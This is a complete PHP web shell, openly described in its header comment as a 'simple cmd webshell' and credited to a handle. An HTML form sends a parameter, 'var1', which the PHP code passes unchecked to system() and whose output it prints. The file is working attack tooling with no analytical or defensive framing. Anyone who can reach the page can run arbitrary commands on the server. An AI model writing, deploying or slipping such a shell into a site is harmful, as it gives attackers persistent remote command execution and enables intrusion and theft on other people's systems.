<!--
Simple cmd webshell with html form
Coded by: Userx
Usage example: http://localhost/php-cmd-shell.php?var1=ls
-->
<HTML>
<BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="var1">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
</BODY>
</HTML>

<?php

if(isset($_REQUEST['var1'])){
        echo "<pre>";
        $cmd = ($_REQUEST['var1']);
        system($cmd);
        echo "</pre>";
        die;
}

?>


